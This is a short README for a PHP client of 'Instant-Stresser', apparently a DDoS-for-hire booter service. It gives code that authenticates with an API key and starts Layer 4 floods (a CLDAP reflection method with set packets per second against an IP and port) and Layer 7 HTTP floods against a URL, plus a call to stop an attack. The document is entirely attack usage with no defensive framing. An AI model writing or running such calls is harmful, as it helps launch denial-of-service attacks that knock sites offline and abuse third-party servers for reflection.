# Instant-Stresser-API
Sample API usage of Instant-Stresser.com

## Requirements
PHP version 5.x (+).<br/>
Libcurl package.

## L4/L7 Methods Syntaxe
Available here : https://instant-stresser.com/help/methodsdoc

## Authentication
```php
require 'InstantStresserApi.php';
// UserID and API Key generated from API Manager website.
$api = new InstantStresser\InstantStresserApi("UserID", "your-apikey");
```

## Layer 4 Attack
```php
/* Parameters : IPv4 , Port , Time , Method , Slots, PPS */
$response = $api->startL4("1.1.1.1", 80, 15, "CLDAP", 1, 100000);
```
## Layer 7 Attack
```php
/* Parameters : URL , Time , Method , Slots , Type, Ratelimit (true = enable, false = disabled) */
$response = $api->startL7("https://example.com/", 15, "HTTP1", 1, "GET", false);
```
## Stop Attack
```php
/* Parameters : Host. */
$response = $api->stop("1.1.1.1");
echo $response; // Get API response.
```
